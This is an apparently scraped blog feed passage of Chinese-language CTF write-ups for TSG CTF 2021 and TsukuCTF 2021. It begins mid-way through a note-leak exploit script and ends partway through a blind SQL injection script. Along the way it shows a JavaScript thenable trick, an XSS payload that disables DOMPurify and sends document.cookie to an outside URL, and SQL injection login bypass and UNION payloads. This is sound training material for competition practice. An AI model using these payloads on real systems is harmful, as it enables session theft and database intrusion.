&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/notes/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info] leaked: &lt;/span>&lt;span style="color:#d88200">{}{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">LEAK_LENGTH&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">))))&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">leaked_id&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CHAR_CANDIDATES&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exploit&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">report_note_as_stylesheet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info]: invoked crawler with a new note: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">exploit_id&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[info] running app ...&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>详细内容参见-&amp;gt;&lt;a href="https://diary.shift-js.info/tsgctf-2021-udon/">wp&lt;/a>&lt;/p>
&lt;h2 id="webbeginners-web-2021">Web/Beginner&amp;rsquo;s Web 2021&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Made drunk, so solved drunk.&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080745266.png" alt="image-20211004080745266">&lt;/p>
&lt;p>给了源码，看下index.js，emmmmmm，创建了session.routes&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004081546667.png" alt="image-20211004081546667">&lt;/p>
&lt;p>但是flag并不会在最后渲染的route中出现&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004092636947.png" alt="image-20211004092636947">&lt;/p>
&lt;p>所以我们想利用GetSalt处的&lt;code>session.salt='flag'&lt;/code>来转到flag的路由上来获得flag&lt;/p>
&lt;p>但是[salt]会导致重写flag，所以我们想要的session是这样的状态&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// salt is anything different from &amp;#39;flag&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>首先用&lt;code>GET /?action=SetSalt&amp;amp;data=flag&lt;/code>来让&lt;code>salt='flag'&lt;/code>，session会变成这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// this route is overwritten and not accessible
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// here is salt
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们想回复到route只有一个flag并且可达的状态，但是又不想删除掉&lt;code>salt: 'flag'&lt;/code>&lt;/p>
&lt;p>关键之处在于&lt;code>set_salt&lt;/code>，它想完成的任务是一起更新routes和salt的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">set_salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">salt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二行中，我们要&lt;code>await setRoutes&lt;/code>，相当于&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">set_salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">salt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里会要到一个setRoutes的返回值result&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">index&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">// redacted
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>很没必要的操作，又一遍setRoutes，纯属脱裤子放屁&lt;/p>
&lt;p>当我们设置&lt;code>salt = 'then'&lt;/code>时，情况就不一样了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">//redacted
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个特殊的then关键字一出来，就很特殊，解释器会试图把它认作是await中要调用的then的部分，但是并没有await需要它这个then执行的result来作为返回值，就卡死在这里了，这个salt无处可去&lt;/p>
&lt;p>So，&lt;code>GET /?action=SetSalt&amp;amp;data=then&lt;/code>之后session将是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>只要&lt;code>GET /?action=GetSalt&lt;/code>即可，因为&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// route = session.salt here (just flag)
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>具体操作一张动图就能说清楚&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/8q7R2If.gif" alt="img">&lt;/p>
&lt;p>最后，这个**的东西学名叫&lt;a href="https://masteringjs.io/tutorials/fundamentals/thenable">Thenable Object&lt;/a>，谢谢你，javascript😅&lt;/p>
&lt;p>参考：&lt;a href="https://hackmd.io/@hakatashi/ryRg7oLEt">wp&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004090604105.png" alt="image-20211004090604105">&lt;/p>
&lt;h2 id="webgiita">Web/Giita&lt;/h2>
&lt;blockquote>
&lt;p>Gibson Les Paul Standard.&lt;/p>
&lt;p>Steal Cookie.&lt;/p>
&lt;/blockquote>
&lt;p>😭😭😭又是cookie&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004082810346.png" alt="image-20211004082810346">&lt;/p>
&lt;p>看源码，app.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161650511.png" alt="image-20211004161650511">&lt;/p>
&lt;p>11行的正则匹配了空格、字母、数字、下划线，但是多余了一个&lt;code>.&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161816780.png" alt="image-20211004161816780">&lt;/p>
&lt;p>会把theme放进去进行一个过滤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004162229240.png" alt="image-20211004162229240">&lt;/p>
&lt;p>然后拼接到stylesheet link中，就再没有什么过滤了&lt;/p>
&lt;p>我们可以注入到href这里，比如&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!-- theme=x%20onerror%3Dalert --&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;stylesheet&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">x&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">alert&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>要完整的注入js代码，我们需要cheat DOMPurify&lt;/p>
&lt;p>DOMPurify会先&lt;a href="https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L156-L160">检测对象&lt;/a>在不在&lt;code>DOMPurify.isSupported&lt;/code>的范围内&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004163456492.png" alt="image-20211004163456492">&lt;/p>
&lt;p>所以呢，我们把它给关咯&lt;/p>
&lt;pre tabindex="0">&lt;code>delete document.implementation.__proto__.createHTMLDocument
&lt;/code>&lt;/pre>&lt;p>最后的Payload，U+00A0(NBSP)不在html的空白符中，但是在Javascript的空白符中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75af00">axios&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;post&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`http://&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">/`&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;content-type&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">encode&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">theme&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;x onerror=delete\xA0document.implemenation__proto__.createHTMLDocument&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">title&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;x&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`&amp;lt;img src=&amp;#34;x&amp;#34; onerror=&amp;#34;location.href&amp;#34;=&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">?&amp;#39; + document.cookie&amp;gt;`&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}),&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>完整参见-&amp;gt;&lt;a href="https://hackmd.io/@hakatashi/HkgG02U4t">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>就是菜 不会做 勉强看看wp 还不一定看得懂&lt;/p>
&lt;p>铁废物了😅&lt;/p></description></item><item><title>TsukuCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</link><pubDate>Mon, 13 Sep 2021 19:15:21 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</guid><description>&lt;p>这两天又开始有点摆烂的迹象，于是把周末的ctf看看wp，水一水，复现一下&lt;/p>
&lt;p>另外这个ctf最痛苦的地方在于是英日夹杂，我开始懂歪果仁做中文比赛页面的时候有多痛苦了&lt;/p>
&lt;h2 id="weblogonly">Web/logonly&lt;/h2>
&lt;p>给出的是一个有214155行的日志文件，只有第214154行返回200ok&lt;/p>
&lt;p>显然是进行了一个字典攻击，在第214154次尝试时撞对了，我们下载一份kali里的rockyou.txt中看一下214154是个啥（有提示用到kali进行攻击）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912171725965.png" alt="image-20210912171725965">&lt;/p>
&lt;p>&lt;code>TsukuCTF{qwertyuiop[]\\}&lt;/code>&lt;/p>
&lt;h2 id="webdigits">Web/digits&lt;/h2>
&lt;p>一个fastapi站，但是要求不是很高的样子&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174109098.png" alt="image-20210912174109098">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174032687.png" alt="image-20210912174032687">&lt;/p>
&lt;p>加号放到url中相当于半角空格&lt;/p>
&lt;p>&lt;code>TsukuCTF{you_are_lucky_Tsukushi}&lt;/code>&lt;/p>
&lt;h2 id="weblogin">Web/login&lt;/h2>
&lt;p>登录框，万能密码&lt;code>admin'or 1#&lt;/code>&lt;/p>
&lt;p>&lt;code>TsukuCTF{You_4r3_SUP3R_H4CKER}&lt;/code>&lt;/p>
&lt;p>一般这种简单的登录都是万能密码，但是也得多试一试，加个注释符啊 分号什么的&lt;/p>
&lt;h2 id="weblogin2">Web/login2&lt;/h2>
&lt;p>说是代码重构过了&lt;/p>
&lt;p>再用上面的万能密码登入会显示这个站的所有账号&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912175523340.png" alt="image-20210912175523340">&lt;/p>
&lt;p>说明还是有sqli，尝试一下联合注入&lt;code>admin'or 1 union select null,null#&lt;/code>，跟上面是一样的回显，说明有两列，然后是愉快的注入（每一次的回显在页面的末尾，注意这个是最初要找到并确认的）&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'or 1 union select table_name,null from information_schema.columns#
admin'or 1 union select column_name,null from information_schema.columns where table_name='super_secret_table'#
admin'or 1 union select secret,null from super_secret_table#
&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}&lt;/code>&lt;/p>
&lt;h2 id="weblogin3">Web/login3&lt;/h2>
&lt;p>依然是存在sqli，用上面的两个payload都能回显正常，但是没有明确的信息，应该是需要盲注了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery_core&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39;or ascii(substring((&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">),&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">,1))&amp;gt;=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">;#&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
